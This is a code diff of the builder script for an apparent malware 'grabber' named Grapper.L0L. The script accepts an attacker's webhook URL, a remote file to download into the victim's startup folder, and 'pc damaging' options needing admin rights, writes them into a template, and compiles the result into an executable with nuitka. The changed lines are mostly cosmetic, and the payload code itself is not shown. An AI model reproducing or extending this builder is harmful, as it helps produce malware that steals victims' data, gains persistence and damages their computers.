@@ -123,7 +123,7 @@ def get_wb():
         r = requests.head(wb)
         if r.status_code == 200:
             print(f"{green}Valid {black}({r.status_code})")
-            with open("resources/code.py", "r") as f:
+            with open("resources/build.py", "r") as f:
                 content = f.read()
                 new_content = content.replace("wb = ''", f"wb = '{wb}'")
             with open("resources/build.py", "w") as f:
@@ -153,7 +153,7 @@ ask("File downloader", "down_file")
 if FILE_DOWNLOADER:
     url = input(f"{red}[{res}URL{red}]{lred} > ")
 
-    with open("resources/code.py", "r") as f:
+    with open("resources/build.py", "r") as f:
         content = f.read()
         new_content = content.replace("down_file_url = ''", f"down_file_url = '{url}'")
     with open("resources/build.py", "w") as f:
@@ -163,7 +163,7 @@ if FILE_DOWNLOADER:
     if path == "startup":
         path = "dir.startup"
 
-    with open("resources/code.py", "r") as f:
+    with open("resources/build.py", "r") as f:
         content = f.read()
         new_content = content.replace("down_file_path = ''", f"down_file_path = '{path}'")
     with open("resources/build.py", "w") as f:
@@ -173,7 +173,7 @@ ask("Music player", "play_music")
 if MUSIC_PLAYER:
     url = input(f"{red}[{res}URL{red}]{lred} > ")
 
-    with open("resources/code.py", "r") as f:
+    with open("resources/build.py", "r") as f:
         content = f.read()
         new_content = content.replace("music_url = ''", f"music_url = '{url}'")
     with open("resources/build.py", "w") as f:
@@ -181,12 +181,12 @@ if MUSIC_PLAYER:
 
 
 def ask_othr():
-    c = input(f"{lred}Do you want to continue to pc damaging/dangarous options? {red}ADMIN IS NEEDED {black}(y/n){lred} > ")
+    c = input(f"{red}[{res}#{red}]{lred} Do you want to continue to pc damaging/dangarous options? {red}ADMIN IS NEEDED {black}(y/n){lred} > ")
     if c == "y":
-        c = input(f"{lred}In order to continue the person running will be asked for admin perms contunue? {black}(y/n){lred} > ")
-        with open("resources/code.py", "r") as f:
+        c = input(f"{red}[{res}#{red}]{lred} In order to continue the person running will be asked for admin perms contunue? {black}(y/n){lred} > ")
+        with open("resources/build.py", "r") as f:
             content = f.read()
-            new_content = content.replace("admin_ask = ''", f"admin_ask = True")
+            new_content = content.replace("admin_ask = False", f"admin_ask = True")
         with open("resources/build.py", "w") as f:
             f.write(new_content)
         if c == "y":
@@ -212,13 +212,24 @@ print(f"""{Fore.RED}
 ██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
  ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
 """)
-print(f"{red}WARNING! {res}RUN ONLY DIRECTLY FROM FILE NOT ANY EXTERNAL SOFTWARE LIKE VISUAL STUDIO CODE")
-print("This will take some time... Please wait for a message box from Grapper.L0L\n\n\n")
-os.remove("build/build.exe")
+print(f"{red}[{res}WARNING{red}]{lred} RUN ONLY DIRECTLY FROM FILE NOT ANY EXTERNAL SOFTWARE LIKE VISUAL STUDIO CODE")
+print(f"{red}[{res}#{red}]{lred} This will take some time... Please wait for a message box from Grapper.L0L\n\n\n")
+try:
+    os.remove("build/build.exe")
+except:
+    pass
 os.system("nuitka --follow-imports resources/build.py")
 os.remove("build.cmd")
 shutil.rmtree("build.build") 
 shutil.copy("build.exe", "build") 
 os.remove("build.exe")
 os.startfile("build")
+os.system("cls")
+print(f"""{Fore.RED}
+ ██████  ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
+██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
+██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
+██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
+ ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
+""")
 messagebox.showinfo("Grapper.l0l", "Build made!")
